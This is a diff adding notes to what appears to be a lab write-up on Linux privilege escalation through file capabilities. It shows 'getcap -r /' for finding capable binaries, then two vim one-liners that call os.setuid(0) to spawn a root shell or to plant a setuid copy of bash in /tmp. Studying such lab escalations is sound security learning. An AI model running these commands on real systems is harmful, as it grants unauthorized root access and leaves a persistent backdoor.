@@ -5,3 +5,34 @@ Capabilities help manage privileges at a more granular level. For example, if th
 ```bash
 getcap -r / 2>/dev/null
 ```
+![img](screenshots/capabilities/getcap_command.png)
+
+* **we see two bin we can use to get root privilege by "setuid" : vim , view**
+
+## exploit vim
+
+* **we use command :**
+
+```bash
+/home/karen/vim -c ':py3 import os; os.setuid(0); os.system("/bin/bash")'
+```
+
+![img](screenshots/capabilities/command.png)
+
+* **then we will get the root shell**
+
+![img](screenshots/capabilities/get_root_capa.png)
+
+other methods is 
+
+* **upgrade our shell to root by command :**
+
+```bash
+/home/karen/vim -c ':py3 import os; os.setuid(0); os.system("cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash")'
+```
+
+![img](screenshots/capabilities/other_command.png)
+
+* **then**
+
+![img](screenshots/capabilities/get_root2.png)
